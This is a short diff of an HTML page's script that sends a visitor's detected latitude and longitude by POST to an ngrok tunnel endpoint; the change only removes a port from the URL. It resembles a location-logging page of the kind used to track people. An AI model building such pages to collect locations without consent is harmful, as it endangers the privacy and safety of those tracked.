@@ -17,7 +17,7 @@
   
     console.log("Ubicación detectada:", lat, lon);
   
-    fetch("https://ff58b0a2105a.ngrok-free.app:5000/log", {
+    fetch("https://ff58b0a2105a.ngrok-free.app/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ latitude: lat, longitude: lon })
@@ -30,6 +30,7 @@
 
 </body>
 </html>
+
 
 
 
